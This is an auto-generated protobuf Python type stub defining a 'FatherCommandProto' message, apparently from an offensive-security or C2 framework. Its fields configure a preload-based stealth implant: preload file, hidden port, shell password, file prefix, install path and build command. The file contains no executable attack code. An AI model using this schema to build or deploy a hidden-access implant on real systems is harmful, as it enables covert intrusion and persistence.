import base_command_pb2 as _base_command_pb2
from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from typing import ClassVar as _ClassVar, Mapping as _Mapping, Optional as _Optional, Union as _Union

DESCRIPTOR: _descriptor.FileDescriptor

class FatherCommandProto(_message.Message):
    __slots__ = ("base", "gid", "srcport", "epochtime", "env_var", "file_prefix", "preload_file", "hiddenport", "shell_pass", "install_path", "local_path", "arch", "build_command")
    BASE_FIELD_NUMBER: _ClassVar[int]
    GID_FIELD_NUMBER: _ClassVar[int]
    SRCPORT_FIELD_NUMBER: _ClassVar[int]
    EPOCHTIME_FIELD_NUMBER: _ClassVar[int]
    ENV_VAR_FIELD_NUMBER: _ClassVar[int]
    FILE_PREFIX_FIELD_NUMBER: _ClassVar[int]
    PRELOAD_FILE_FIELD_NUMBER: _ClassVar[int]
    HIDDENPORT_FIELD_NUMBER: _ClassVar[int]
    SHELL_PASS_FIELD_NUMBER: _ClassVar[int]
    INSTALL_PATH_FIELD_NUMBER: _ClassVar[int]
    LOCAL_PATH_FIELD_NUMBER: _ClassVar[int]
    ARCH_FIELD_NUMBER: _ClassVar[int]
    BUILD_COMMAND_FIELD_NUMBER: _ClassVar[int]
    base: _base_command_pb2.BaseCommandFields
    gid: str
    srcport: str
    epochtime: str
    env_var: str
    file_prefix: str
    preload_file: str
    hiddenport: str
    shell_pass: str
    install_path: str
    local_path: str
    arch: str
    build_command: str
    def __init__(self, base: _Optional[_Union[_base_command_pb2.BaseCommandFields, _Mapping]] = ..., gid: _Optional[str] = ..., srcport: _Optional[str] = ..., epochtime: _Optional[str] = ..., env_var: _Optional[str] = ..., file_prefix: _Optional[str] = ..., preload_file: _Optional[str] = ..., hiddenport: _Optional[str] = ..., shell_pass: _Optional[str] = ..., install_path: _Optional[str] = ..., local_path: _Optional[str] = ..., arch: _Optional[str] = ..., build_command: _Optional[str] = ...) -> None: ...
